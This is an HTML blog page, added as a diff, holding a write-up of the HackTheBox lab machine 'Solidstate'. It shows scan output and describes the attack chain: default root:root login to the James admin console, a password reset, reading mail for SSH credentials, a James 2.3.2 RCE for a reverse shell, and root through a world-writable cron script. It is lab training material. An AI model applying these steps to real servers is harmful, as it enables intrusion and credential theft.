@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+  <head>
+  <meta charset="utf-8" />
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <title>HackTheBox - WriteUp 5 &middot; Pat~ Pat~ Meow~</title>
+  <meta name="description" content="HackTheBox 练手" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" />
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://www.kmahyyg.xyz/css/main.min.css" />
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-123948588-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+  <style>
+    body {
+      background: #ecedef url("https://alicdn.kmahyyg.xyz/asset_files/aether/bgimg.webp") repeat;
+    }
+  </style>
+</head>
+  <body class="single-body">
+    <nav class="nav-bar side-padding">
+  <h1 class="nav-header"><a href="https://www.kmahyyg.xyz/" class="nav-text">Patrick Young</a></h1>
+  <div class="hamburger-menu">
+    <button onclick="hamburgerMenuPressed.call(this)" aria-haspopup="true" aria-expanded="false" aria-controls="menu" aria-label="Menu">
+      <span></span>
+      <span></span>
+    </button>
+    <ul id="menu" class="hamburger-menu-overlay">
+      <li><a href="https://www.kmahyyg.xyz/" class="hamburger-menu-overlay-link">Home</a></li>
+      <li><a href="https://www.kmahyyg.xyz/express-page/" class="hamburger-menu-overlay-link">Express Inc</a></li>
+      <li><a href="https://www.kmahyyg.xyz/about-me-page/" class="hamburger-menu-overlay-link">About</a></li>
+      <li><a href="https://www.kmahyyg.xyz/archlinux-bug-page/" class="hamburger-menu-overlay-link">Arch Linux</a></li>
+      <li><a href="https://www.kmahyyg.xyz/donate-page/" class="hamburger-menu-overlay-link">Donate</a></li>
+      <li><a href="https://www.kmahyyg.xyz/categories/code" class="hamburger-menu-overlay-link">Code</a></li><li><a href="https://www.kmahyyg.xyz/categories/life" class="hamburger-menu-overlay-link">Life</a></li><li><a href="https://www.kmahyyg.xyz/categories/network" class="hamburger-menu-overlay-link">Network</a></li><li><a href="https://www.kmahyyg.xyz/categories/school" class="hamburger-menu-overlay-link">School</a></li><li><a href="https://www.kmahyyg.xyz/categories/tech" class="hamburger-menu-overlay-link">Tech</a></li>
+    </ul>
+  </div>
+</nav>
+    <main class="content side-text-padding">
+      <article class="post ">
+        <header class="post-header">
+        	<h1 class="post-title">HackTheBox - WriteUp 5</h1>
+          <p class="post-date">Posted <time datetime="2019-05-24">May 24, 2019</time></p>
+        </header>
+        
+        <picture class="post-figure">
+            
+            <source srcset="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp">
+          <img src="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp" >
+        </picture>
+        
+        
+
+<h1 id="solidstate">Solidstate</h1>
+
+<h2 id="before-attack">Before Attack</h2>
+
+<pre><code># Nmap 7.70 scan initiated Fri May 24 05:56:47 2019 as: nmap -A -Pn -p1-65535 -oA solidstate 10.10.10.51
+
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
+25/tcp   open  smtp        JAMES smtpd 2.3.2
+|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.2 [10.10.14.2]), 
+80/tcp   open  http        Apache httpd 2.4.25 ((Debian))
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Home - Solid State Security
+110/tcp  open  pop3        JAMES pop3d 2.3.2
+119/tcp  open  nntp        JAMES nntpd (posting ok)
+4555/tcp open  james-admin JAMES Remote Admin 2.3.2
+</code></pre>
+
+<p>Go to <code>searchsploit james</code> : <code>Apache James Server 2.3.2 - Remote Command Execution | exploits/linux/remote/35513.py</code></p>
+
+<p>Found this detailed explaination: <a href="https://www.exploit-db.com/docs/english/40123-exploiting-apache-james-server-2.3.2.pdf">https://www.exploit-db.com/docs/english/40123-exploiting-apache-james-server-2.3.2.pdf</a></p>
+
+<p>Check the exploit code, found that this exploit must be triggered by someone logging into the server.</p>
+
+<p>So, after I <code>gobuster</code>-ed this site on 80 port:</p>
+
+<pre><code>/images (Status: 301)
+/index.html (Status: 200)
+/about.html (Status: 200)
+/services.html (Status: 200)
+/assets (Status: 301)
+/README.txt (Status: 200)
+/LICENSE.txt (Status: 200)
+</code></pre>
+
+<p>Nothing seems to be useful.</p>
+
+<p>Next, Let&rsquo;s check the smtp via Nmap Script:</p>
+
+<pre><code>Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-24 06:38 UTC
+Nmap scan report for 10.10.10.51
+Host is up (0.020s latency).
+
+PORT   STATE SERVICE
+25/tcp open  smtp
+| smtp-enum-users: 
+|_  root
+
+Nmap done: 1 IP address (1 host up) scanned in 1.49 seconds
+</code></pre>
+
+<p>That&rsquo;s all we can find now.</p>
+
+<h2 id="start-attack">Start attack.</h2>
+
+<h3 id="get-the-normal-user">Get the normal user</h3>
+
+<p>According to the exploit code and <code>nmap</code> result, <code>nc 10.10.10.51 4555</code>, Login with <code>root:root</code>, next, Issue a <code>help</code>.</p>
+
+<p><code>help</code> tells us that we could use this interface to reset someone&rsquo;s password. I guess the one related to the site is <code>mindy</code>.</p>
+
+<p>Then, reset the password: <code>setpassword mindy testpass</code>.</p>
+
+<p>Maybe the user credential is in the mailbox. Check POP3: <code>telnet 10.10.10.51 110</code>, Use following code to get the result:</p>
+
+<pre><code>USER mindy
+PASS testpass
+LIST
+RETR 2
+</code></pre>
+
+<p>Found the credential in the mail content, trying to login in SSH. Success. You are running under a <code>rbash</code> with only <code>env</code> &amp; <code>ls</code> &amp; <code>cat</code> available.</p>
+
+<pre><code>username: mindy
+pass: P@55W0rd1!2@
+</code></pre>
+
+<h3 id="use-the-exploit-code-below">Use the exploit code below</h3>
+
+<p>The above exploit code we just found can be used here.</p>
+
+<p>Just modify the payload inside the exploit to receive a reverse shell. Then, use Python to spawn a tty. Set <code>$PATH</code> and <code>$TERM</code>.</p>
+
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+
+<p>Use <code>LinEnum.sh</code>, found a 777 file called <code>/opt/tmp.py</code> used for clean the <code>/tmp</code>, Check again, owned by <code>root:root</code>.</p>
+
+<p>You can also use <code>pspy</code> to find this.</p>
+
+<p>What&rsquo;s behind?</p>
+
+<p><code>cat /etc/crontab</code></p>
+
+<pre><code># m h  dom mon dow   command
+*/3 * * * * python /opt/tmp.py
+
+-rwxrwxrwx  1 root root 104 Aug 22 2017 03:38 tmp.py
+</code></pre>
+
+<p>Just that.</p>
+
+<p>So modify <code>os.system()</code> in this file to get whatever you want.</p>
+
+<p>(END)</p>
+
+      </article>
+      <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "kmahyyg" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+    </main>
+    <nav class="end-nav side-padding">
+      
+      <a ontouchstart="cardPressed.call(this)" ontouchend="cardReleased.call(this)" ontouchmove="cardReleased.call(this)" 
+  href="https://www.kmahyyg.xyz/welovecode/2019-htb-writeup4/" class="card blog-card" rel="bookmark" >
+    
+    <div class="card-img-container">
+      <p class="card-img-overlay">Next Article</p>
+      <picture>
+        
+        <source srcset="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp">
+        <img src="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp" class="card-img" >
+      </picture>
+    </div>
+    
+  <article class="card-body">
+    <h2 class="card-title">HackTheBox - WriteUp 4</h2>
+    <p class="card-text">HackTheBox 练手</p>
+    <div class="card-subtext muted-text">
+      <p>Posted <time datetime="2019-05-18 518:00">May 18, 2019</time></p>
+      <p>#tech </p>
+    </div>
+  </article>
+</a>
+      
+      <a ontouchstart="cardPressed.call(this)" ontouchend="cardReleased.call(this)" ontouchmove="cardReleased.call(this)" 
+  href="https://www.kmahyyg.xyz/" class="card home-card" style="background-image: url( https://alicdn.kmahyyg.xyz/asset_files/aether/backtohome.webp )" rel="bookmark" >
+  Home
+</a>
+    </nav>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/highlight.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous"
+    onload="renderMathInElement(document.body);"></script>
+<script src="https://www.kmahyyg.xyz/js/core.js"></script>
+<script>
+  hljs.initHighlightingOnLoad();
+</script>
+  </body>
+</html>
